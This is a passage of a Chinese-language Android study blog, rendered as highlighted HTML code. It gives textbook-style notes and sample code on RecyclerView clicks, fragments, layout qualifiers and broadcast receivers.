class="string">&quot;You click view&quot;</span>+fruit.getName(), Toast.LENGTH_SHORT).show();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        holder.fruitImage.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View view)</span> &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">position</span> <span class="operator">=</span> holder.getAdapterPosition();</span><br><span class="line">                <span class="type">Fruit</span> <span class="variable">fruit</span> <span class="operator">=</span> mFruitList.get(position);</span><br><span class="line">                Toast.makeText(view.getContext(), <span class="string">&quot;You click image&quot;</span>+fruit.getImageId(), Toast.LENGTH_SHORT).show();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">return</span> holder;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="碎片-Fragment"><a href="#碎片-Fragment" class="headerlink" title="碎片(Fragment)"></a>碎片(Fragment)</h3><p>碎片：一种可以嵌入在活动当中的UI片段，能让程序更加合理充分的利用大屏幕空间。可以类比为一个迷你型的活动，虽然可能和活动一样大</p><h4 id="碎片基本使用"><a href="#碎片基本使用" class="headerlink" title="碎片基本使用"></a><strong>碎片基本使用</strong></h4><p>left_fragment.xml</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;Button</span><br><span class="line">        android:<span class="attribute">id</span>=<span class="string">&quot;@+id/button&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_gravity</span>=<span class="string">&quot;center_horizontal&quot;</span></span><br><span class="line">        android:<span class="attribute">text</span>=<span class="string">&quot;Button&quot;</span>/&gt;</span><br></pre></td></tr></table></figure><p>right_fragment.xml</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;TextView</span><br><span class="line">        android:<span class="attribute">layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_gravity</span>=<span class="string">&quot;center_horizontal&quot;</span></span><br><span class="line">        android:<span class="attribute">textSize</span>=<span class="string">&quot;20sp&quot;</span></span><br><span class="line">        android:<span class="attribute">text</span>=<span class="string">&quot;This is right fragment&quot;</span>/&gt;</span><br></pre></td></tr></table></figure><p>LeftFragment类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LeftFragment</span> <span class="keyword">extends</span> <span class="title class_">Fragment</span> &#123;</span><br><span class="line">    <span class="meta">@Nullable</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> View <span class="title function_">onCreateView</span><span class="params">(<span class="meta">@NonNull</span> LayoutInflater inflater, <span class="meta">@Nullable</span> ViewGroup container, <span class="meta">@Nullable</span> Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        View view=inflater.inflate(R.layout.left_fragment,container,<span class="literal">false</span>)</span><br><span class="line">        <span class="keyword">return</span> view;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>RightFragment同理</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RightFragment</span> <span class="keyword">extends</span> <span class="title class_">Fragment</span> &#123;</span><br><span class="line">    <span class="meta">@Nullable</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> View <span class="title function_">onCreateView</span><span class="params">(<span class="meta">@NonNull</span> LayoutInflater inflater, <span class="meta">@Nullable</span> ViewGroup container, <span class="meta">@Nullable</span> Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        View view=inflater.inflate(R.layout.right_fragment,container,<span class="literal">false</span>);</span><br><span class="line">        <span class="keyword">return</span> view;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改activiti_main.xml</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;fragment</span><br><span class="line">        android:<span class="attribute">id</span>=<span class="string">&quot;@+id/left_fragment&quot;</span></span><br><span class="line">        android:<span class="attribute">name</span>=<span class="string">&quot;com.example.fragmenttest.LeftFragment&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_width</span>=<span class="string">&quot;0dp&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_height</span>=<span class="string">&quot;match_parent&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_weight</span>=<span class="string">&quot;1&quot;</span>/&gt;</span><br><span class="line">&lt;fragment</span><br><span class="line">        android:<span class="attribute">id</span>=<span class="string">&quot;@+id/right_fragment&quot;</span></span><br><span class="line">        android:<span class="attribute">name</span>=<span class="string">&quot;com.example.fragmenttest.RightFragment&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_width</span>=<span class="string">&quot;0dp&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_height</span>=<span class="string">&quot;match_parent&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_weight</span>=<span class="string">&quot;1&quot;</span>/&gt;</span><br></pre></td></tr></table></figure><h4 id="动态加载碎片"><a href="#动态加载碎片" class="headerlink" title="动态加载碎片"></a>动态加载碎片</h4><p>新建一个another_activiti_main.xml</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;TextView</span><br><span class="line">        android:<span class="attribute">layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_gravity</span>=<span class="string">&quot;center_horizontal&quot;</span></span><br><span class="line">        android:<span class="attribute">textSize</span>=<span class="string">&quot;20sp&quot;</span></span><br><span class="line">        android:<span class="attribute">text</span>=<span class="string">&quot;This is another right fragment&quot;</span>/&gt;</span><br></pre></td></tr></table></figure><p>新建一个类AnotherRightFragment</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AnotherRightFragment</span> <span class="keyword">extends</span> <span class="title class_">Fragment</span> &#123;</span><br><span class="line">    <span class="meta">@Nullable</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> View <span class="title function_">onCreateView</span><span class="params">(<span class="meta">@NonNull</span> LayoutInflater inflater, <span class="meta">@Nullable</span> ViewGroup container, <span class="meta">@Nullable</span> Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        View view=inflater.inflate(R.layout.another_right_fragment,container,<span class="literal">false</span>);</span><br><span class="line">        <span class="keyword">return</span> view;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改activity_main.xml</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;fragment</span><br><span class="line">        android:<span class="attribute">id</span>=<span class="string">&quot;@+id/left_fragment&quot;</span></span><br><span class="line">        android:<span class="attribute">name</span>=<span class="string">&quot;com.example.fragmenttest.LeftFragment&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_width</span>=<span class="string">&quot;0dp&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_height</span>=<span class="string">&quot;match_parent&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_weight</span>=<span class="string">&quot;1&quot;</span>/&gt;</span><br><span class="line">&lt;FrameLayout</span><br><span class="line">        android:<span class="attribute">id</span>=<span class="string">&quot;@+id/right_layout&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_width</span>=<span class="string">&quot;0dp&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_height</span>=<span class="string">&quot;match_parent&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_weight</span>=<span class="string">&quot;1&quot;</span>/&gt;</span><br></pre></td></tr></table></figure><p>main.java如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        <span class="type">Button</span> <span class="variable">button</span> <span class="operator">=</span> (Button) findViewById(R.id.button);</span><br><span class="line">        button.setOnClickListener(<span class="built_in">this</span>);</span><br><span class="line">        replaceFragment(<span class="keyword">new</span> <span class="title class_">RightFragment</span>());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">        <span class="keyword">switch</span> (v.getId()) &#123;</span><br><span class="line">            <span class="keyword">case</span> R.id.button:</span><br><span class="line">                replaceFragment(<span class="keyword">new</span> <span class="title class_">AnotherRightFragment</span>());</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">replaceFragment</span><span class="params">(Fragment fragment)</span> &#123;</span><br><span class="line">        <span class="type">FragmentManager</span> <span class="variable">fragmentManager</span> <span class="operator">=</span> getSupportFragmentManager();</span><br><span class="line">        <span class="type">FragmentTransaction</span> <span class="variable">transaction</span> <span class="operator">=</span> fragmentManager.beginTransaction();</span><br><span class="line">        transaction.replace(R.id.right_layout, fragment);</span><br><span class="line">        transaction.addToBackStack(<span class="literal">null</span>);</span><br><span class="line">        transaction.commit();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h4 id="碎片中模拟返回栈"><a href="#碎片中模拟返回栈" class="headerlink" title="碎片中模拟返回栈"></a>碎片中模拟返回栈</h4><p>通过点击按钮添加碎片后，按Back键程序自动退出，如果模拟类似返回栈效果，如下</p><p>在FragmentTransaction提供的addToBackStack()，用于将一个事务添加到返回栈</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">replaceFragment</span><span class="params">(Fragment fragment)</span> &#123;</span><br><span class="line">        <span class="type">FragmentManager</span> <span class="variable">fragmentManager</span> <span class="operator">=</span> getSupportFragmentManager();</span><br><span class="line">        <span class="type">FragmentTransaction</span> <span class="variable">transaction</span> <span class="operator">=</span> fragmentManager.beginTransaction();</span><br><span class="line">        transaction.replace(R.id.right_layout, fragment);</span><br><span class="line">    </span><br><span class="line">        transaction.addToBackStack(<span class="literal">null</span>);</span><br><span class="line">    </span><br><span class="line">        transaction.commit();</span><br></pre></td></tr></table></figure><h4 id="碎片和活动进行通信"><a href="#碎片和活动进行通信" class="headerlink" title="碎片和活动进行通信"></a>碎片和活动进行通信</h4><p><strong>活动与碎片通信</strong></p><p>获得碎片实例,就可以调用碎片里的方法</p><p><code>RightFragment rightFragment=getFragmentManager().findFragmentById(R.id.right_fragment);</code></p><p><strong>碎片与活动通信</strong></p><p>获得与碎片关联的活动实例</p><p>MainActivity activity = (MainActivity) getActivity();</p><h4 id="动态加载布局技巧"><a href="#动态加载布局技巧" class="headerlink" title="动态加载布局技巧"></a>动态加载布局技巧</h4><p>实现 程序可以根据设备的分辨率或者屏幕大小在运行时来决定加载那个布局</p><h5 id="使用限定符"><a href="#使用限定符" class="headerlink" title="使用限定符"></a>使用限定符</h5><p>修改FragmentTest项目的activity_main.xml</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;fragment</span><br><span class="line">        android:<span class="attribute">id</span>=<span class="string">&quot;@+id/left_fragment&quot;</span></span><br><span class="line">        android:<span class="attribute">name</span>=<span class="string">&quot;com.example.fragmenttest.LeftFragment&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_height</span>=<span class="string">&quot;match_parent&quot;</span>/&gt;</span><br></pre></td></tr></table></figure><p>在res文件夹下新建layout-large文件夹，里面新建activity_main.xml</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;fragment</span><br><span class="line">        android:<span class="attribute">id</span>=<span class="string">&quot;@+id/left_fragment&quot;</span></span><br><span class="line">        android:<span class="attribute">name</span>=<span class="string">&quot;com.example.fragmenttest.LeftFragment&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_width</span>=<span class="string">&quot;0dp&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_height</span>=<span class="string">&quot;match_parent&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_weight</span>=<span class="string">&quot;1&quot;</span>/&gt;</span><br><span class="line">&lt;fragment</span><br><span class="line">        android:<span class="attribute">id</span>=<span class="string">&quot;@+id/right_fragment&quot;</span></span><br><span class="line">        android:<span class="attribute">name</span>=<span class="string">&quot;com.example.fragmenttest.RightFragment&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_width</span>=<span class="string">&quot;0dp&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_height</span>=<span class="string">&quot;match_parent&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_weight</span>=<span class="string">&quot;3&quot;</span>/&gt;</span><br></pre></td></tr></table></figure><p>上面那个文件夹的<code>large</code>就是限定符，小屏幕加载layout下布局 大屏幕加载layout-large下布局</p><p><img src="2025-01-15-《第一行代码》阅读笔记/image-20240725103301782.png" alt="image-20240725103301782"></p><p><img src="2025-01-15-《第一行代码》阅读笔记/image-20240725103310000.png" alt="image-20240725103310000"></p><h5 id="使用最小限定符"><a href="#使用最小限定符" class="headerlink" title="使用最小限定符"></a>使用最小限定符</h5><p>新建layout-sw600dp文件夹，下面新建activity_main.xml布局</p><p>当程序运行在屏幕宽度大于600dp时 加载layout-sw600dp文件夹下布局，反则正常加载。</p><h3 id="广播接受者"><a href="#广播接受者" class="headerlink" title="广播接受者"></a>广播接受者</h3><p><strong>标准广播</strong> （Normal broadcasts）是一种完全异步执行的广播，在广播发出之后，所有的广播接收器几乎都会在同一时刻接收到这条广播消息，因此它们之间没有任何先后顺序可言。这种广播的效率会比较高，但同时也意味着它是无法被截断的。</p><p><strong>有序广播</strong> （Ordered broadcasts）则是一种同步执行的广播，在广播发出之后，同一时刻只会有一个广播接收器能够收到这条广播消息，当这个广播接收器中的逻辑执行完毕后，广播才会继续传递。所以此时的广播接收器是有先后顺序的，优先级高的广播接收器就可以先收到广播消息，并且前面的广播接收器还可以截断正在传递的广播，这样后面的广播接收器就无法收到广播消息了。</p><p><strong>接收系统广播</strong></p><h5 id="动态注册监听网络变化"><a href="#动态注册监听网络变化" class="headerlink" title="动态注册监听网络变化"></a>动态注册监听网络变化</h5><p>新建一个类，让它继承自<code>BroadcastReceiver</code> ，并重写父类的<code>onReceive()</code> 方法。当有广播到来时，<code>onReceive()</code> 方法就会得到执行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> IntentFilter intentFilter;</span><br><span class="line">    <span class="keyword">private</span> NetworkChangeReceiver networkChangeReceiver;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        <span class="comment">// 创建一个intent过滤器</span></span><br><span class="line">        intentFilter = <span class="keyword">new</span> <span class="title class_">IntentFilter</span>();</span><br><span class="line">        <span class="comment">// 添加想要接收的intent请求</span></span><br><span class="line">        intentFilter.addAction(<span class="string">&quot;android.net.conn.CONNECTIVITY_CHANGE&quot;</span>);</span><br><span class="line">        <span class="comment">// 实例化 Receiver类</span></span><br><span class="line">        networkChangeReceiver = <span class="keyword">new</span> <span class="title class_">NetworkChangeReceiver</span>();</span><br><span class="line">        <span class="comment">// 动态注册广播接收者</span></span><br><span class="line">        registerReceiver(networkChangeReceiver, intentFilter);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onDestroy</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onDestroy();</span><br><span class="line">        <span class="comment">// 取消注册广播接收者</span></span><br><span class="line">        unregisterReceiver(networkChangeReceiver);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">NetworkChangeReceiver</span> <span class="keyword">extends</span> <span class="title class_">BroadcastReceiver</span> &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceive</span><span class="params">(Context context, Intent intent)</span> &#123;</span><br><span class="line">            <span class="comment">// 当收到广播时，弹窗提示网络状态改变</span></span><br><span class="line">            Toast.makeText(context, <span class="string">&quot;network changes&quot;</span>, Toast.LENGTH_SHORT).show();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>或者当网络状态改变时，提示当前有网络还是无网络</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">NetworkChangeReceiver</span> <span class="keyword">extends</span> <span class="title class_">BroadcastReceiver</span> &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceive</span><span class="params">(Context context, Intent intent)</span> &#123;</span><br><span class="line">            <span class="comment">// 得到ConnectivityManager实例(一个系统服务类，专门用于管理网络连接)</span></span><br><span class="line">            <span class="type">ConnectivityManager</span> <span class="variable">connectionManager</span> <span class="operator">=</span> (ConnectivityManager)getSystemService(Context.CONNECTIVITY_SERVICE);</span><br><span class="line">            <span class="comment">// 得到NetworkInfo的实例</span></span><br><span class="line">            <span class="type">NetworkInfo</span> <span class="variable">networkInfo</span> <span class="operator">=</span> connectionManager.getActiveNetworkInfo();</span><br><span class="line">            <span class="comment">// 通过调用NetworkInfo的isAvailable()方法，来判断出当前有无网络</span></span><br><span class="line">            <span class="keyword">if</span> (networkInfo != <span class="literal">null</span> &amp;&amp; networkInfo.isAvailable()) &#123;</span><br><span class="line">                Toast.makeText(context, <span class="string">&quot;network is available&quot;</span>,</span><br><span class="line">                    Toast.LENGTH_SHORT).show();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                Toast.makeText(context, <span class="string">&quot;network is unavailable&quot;</span>,</span><br><span class="line">                    Toast.LENGTH_SHORT).show();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同时，访问网络状态需要在<code>AndroidManifest.xml</code>中声明权限</p><h5 id="静态注册实现开机启动提醒"><a href="#静态注册实现开机启动提醒" class="headerlink" title="静态注册实现开机启动提醒"></a>静态注册实现开机启动提醒</h5><p>需要在<code>AndroidManifest.xml</code>中注册receiver</p><receiver    android:name=".BootCompleteReceiver"    android:enabled="true"    android:exported="true">    <intent-filter>        <!-- 开机事件广播 -->        <action android:name="android.intent.action.BOOT_COMPLETED" />    </intent-filter></receiver><p>同时需要添加相应监听开机的权限</p><p>之后便可以添加一个Receiver.java，并在<code>onReceive()</code>中编写相应控制逻辑</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BootCompleteReceiver</span> <span class="keyword">extends</span> <span class="title class_">BroadcastReceiver</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceive</span><span class="params">(Context context, Intent intent)</span> &#123;</span><br><span class="line">        Toast.makeText(context, <span class="string">&quot;Boot Complete&quot;</span>, Toast.LENGTH_LONG).show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不要在<code>onReceive()</code> 方法中添加过多的逻辑或者进行任何的耗时操作，因为在广播接收器中是不允许开启线程的，当<code>onReceive()</code> 方法运行了较长时间而没有结束时，程序就会报错。</p><h5 id="发送自定义广播"><a href="#发送自定义广播" class="headerlink" title="发送自定义广播"></a>发送自定义广播</h5><p>发送标准广播</p><p>定义一个自己的广播接收器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyBroadcastReceiver</span> <span class="keyword">extends</span> <span class="title class_">BroadcastReceiver</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceive</span><span class="params">(Context context, Intent intent)</span> &#123;</span><br><span class="line">        Toast.makeText(context, <span class="string">&quot;received in MyBroadcastReceiver&quot;</span>, Toast.LENGTH_</span><br><span class="line">            SHORT).show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">receiver</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:name</span>=<span class="string">&quot;.MyBroadcastReceiver&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:enabled</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;com.example.broadcasttest.MY_BROADCAST&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>接收一个值为<code>com.example.broadcasttest.MY_BROADCAST</code>的广播</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">    <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(<span class="string">&quot;com.example.broadcasttest.MY_BROADCAST&quot;</span>);</span><br><span class="line">    sendBroadcast(intent);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 同</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">    <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">    intent.setAction(<span class="string">&quot;com.example.broadcasttest.MY_BROADCAST&quot;</span>);</span><br><span class="line">    intent.setPackage(<span class="string">&quot;com.example.broadcasttest&quot;</span>);</span><br><span class="line">    sendBroadcast(intent);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于广播是使用Intent进行传递的，因此你还可以在Intent中携带一些数据传递给广播接收器。</p><p>发送有序广播</p><p>发送时</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">    <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span></span><br><span class="line">        <span class="title class_">Intent</span>(<span class="string">&quot;com.example.broadcasttest.MY_BROADCAST&quot;</span>);</span><br><span class="line">    sendOrderedBroadcast(intent, <span 